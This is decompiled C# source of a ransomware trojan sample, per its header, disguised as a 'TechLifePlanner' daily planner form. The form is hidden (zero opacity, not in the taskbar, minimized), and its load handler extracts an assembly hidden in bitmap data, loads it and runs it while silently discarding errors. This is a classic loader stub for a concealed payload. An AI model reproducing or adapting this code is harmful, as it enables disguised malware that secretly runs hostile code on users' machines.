// Decompiled with JetBrains decompiler
// Type: TechLifePlanner.DailyPlanner
// Assembly: TechLifePlanner, Version=1.2.2.1, Culture=neutral, PublicKeyToken=null
// MVID: 712C5B30-E9BA-4249-B09C-3499B28655CB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.blxe-1cf57eb8143c825ce27f9f6b11247f429bffee3db4a8b402c645dee7a32acee0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using TechLifePlanner.BaseFunctions.FunctionA;

namespace TechLifePlanner
{
  [DesignerGenerated]
  public class DailyPlanner : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("DateTimePicker1")]
    private DateTimePicker _DateTimePicker1;

    [DebuggerNonUserCode]
    static DailyPlanner()
    {
    }

    [DebuggerNonUserCode]
    public DailyPlanner()
    {
      this.Load += new EventHandler(this.LoadDates);
      DailyPlanner.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (DailyPlanner.__ENCList)
      {
        if (DailyPlanner.__ENCList.Count == DailyPlanner.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (DailyPlanner.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (DailyPlanner.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                DailyPlanner.__ENCList[index1] = DailyPlanner.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          DailyPlanner.__ENCList.RemoveRange(index1, checked (DailyPlanner.__ENCList.Count - index1));
          DailyPlanner.__ENCList.Capacity = DailyPlanner.__ENCList.Count;
        }
        DailyPlanner.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.DateTimePicker1 = new DateTimePicker();
      this.SuspendLayout();
      this.DateTimePicker1.Location = new Point(0, 33);
      this.DateTimePicker1.Name = "DateTimePicker1";
      DateTimePicker dateTimePicker1 = this.DateTimePicker1;
      Size size1 = new Size(142, 20);
      Size size2 = size1;
      dateTimePicker1.Size = size2;
      this.DateTimePicker1.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(142, 104);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.DateTimePicker1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (DailyPlanner);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    internal virtual DateTimePicker DateTimePicker1
    {
      [DebuggerNonUserCode] get => this._DateTimePicker1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._DateTimePicker1 = value;
    }

    public void LoadDates(object sender, EventArgs e)
    {
      try
      {
        if (!Operators.ConditionalCompareObjectEqual(Start.Setup(Assembly.Load(GetImages.ParseBitmaps())), (object) true, false))
          return;
        Debug.WriteLine("Appointments Loaded...");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
